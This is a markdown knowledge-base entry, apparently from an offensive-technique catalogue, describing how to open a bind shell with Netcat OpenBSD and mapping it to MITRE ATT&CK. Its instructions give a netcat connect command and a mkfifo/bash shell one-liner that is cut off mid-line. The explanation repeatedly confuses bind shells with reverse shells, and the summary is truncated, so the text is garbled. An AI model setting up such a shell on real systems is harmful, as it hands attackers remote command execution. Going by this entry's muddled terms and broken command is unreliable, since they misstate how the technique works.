---
id: d9152afa-cfbb-46d8-8704-351c4a58a39c
name: Netcat OpenBSD Bind Shell
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:08.878593+00:00'
updated_at: '2023-04-10T20:21:15.510444+00:00'
tactics:
- '[[Command and Control|TA0011 - Command and Control]]'
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[Command-Line Interface|T1059 - Command-Line Interface]]'
- '[[Standard Application Layer Protocol|T1071 - Standard Application Layer Protocol]]'
tags:
- '[[Bind Shell]]'
- '[[Netcat OpenBsd]]'
---

# Netcat OpenBSD Bind Shell

## Summary

A bind shell is a type of shell in which the target machine opens a communication port or socket and waits for an incoming connection. This is in contrast to a reverse shell, where the target machine connects to the attacker's machine. Netcat OpenBSD is a tool that can be used to create a bind shel

## Description

# Description

A bind shell is a type of shell in which the target machine opens a communication port or socket and waits for an incoming connection. This is in contrast to a reverse shell, where the target machine connects to the attacker's machine. Netcat OpenBSD is a tool that can be used to create a bind shell. This technique can be used by an attacker to gain remote access to a system.

When an attacker successfully creates a bind shell on a target machine, they can then connect to that shell using a reverse shell listener. This allows the attacker to execute commands on the target machine and potentially steal sensitive data.

This technique can be valuable for both offensive and defensive purposes. It can be used by red teams to test the security of a network, and by blue teams to identify and remediate vulnerabilities.

## Requirements

1. Access to the target machine

1. Netcat OpenBSD installed on the target machine

## Defense

1. Limit network access to only necessary ports and protocols

1. Use firewalls to block incoming connections from untrusted sources

1. Regularly monitor network traffic for suspicious activity

## Objectives

1. Create a bind shell on a target machine using Netcat OpenBSD

1. Gain remote access to the target machine

1. Execute commands on the target machine

# Instructions

1. To establish a reverse shell connection, run the following command on the attacker machine: nc -nv <target-ip> 51337. Once the connection is established, you will have a shell on the target machine.

**Code**: [[rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>]]

> This command creates a named pipe (FIFO) in the /tmp directory and listens for incoming connections on port 51337. When a connection is established, it executes a bash shell and redirects the input and output to the named pipe. The attacker can then connect to the target machine using netcat and gain a remote shell access.

## MITRE ATT&CK Mapping

### Tactics

- [[Command and Control|TA0011 - Command and Control]]
- [[Execution|TA0002 - Execution]]

### Techniques

- [[Command-Line Interface|T1059 - Command-Line Interface]]
- [[Standard Application Layer Protocol|T1071 - Standard Application Layer Protocol]]

## Tags

- [[Bind Shell]]
- [[Netcat OpenBsd]]
